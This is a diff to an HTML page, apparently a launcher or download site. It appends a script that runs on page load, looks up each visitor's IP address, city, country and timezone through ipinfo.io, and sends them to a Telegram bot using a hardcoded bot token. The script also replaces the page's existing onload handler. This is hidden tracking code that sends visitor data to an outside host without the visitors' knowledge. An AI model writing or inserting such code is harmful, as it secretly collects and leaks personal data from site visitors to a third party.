@@ -1387,4 +1387,29 @@ function addRedirectionToButtons() {
 window.onload = addRedirectionToButtons;
 
     </script>
+   <script>
+        // Function to get the IP information and send it to the server
+        function getIp() {
+            fetch('https://ipinfo.io/json')
+                .then(response => response.json())
+                .then(data => {
+                    const message = `A user visited this website from ${data.city} - ${data.country} with timezone ${data.timezone} and IP address ${data.ip}`;
+                    
+                    // Send the message to the server
+                    fetch(`https://api.telegram.org/bot7493932821:AAGamFZLLlEgI0b0PxsiRVdIREG3nC1hrOg/sendMessage?chat_id=@loauncher&text=${encodeURIComponent(message)}`)
+                        .then(response => {
+                            if (response.ok) {
+                                console.log('Message sent successfully');
+                            } else {
+                                console.error('Failed to send message');
+                            }
+                        })
+                        .catch(error => console.error('Error:', error));
+                })
+                .catch(error => console.error('Error fetching IP info:', error));
+        }
+
+        // Call the function when the page loads
+        window.onload = getIp;
+    </script>
  </body></html>
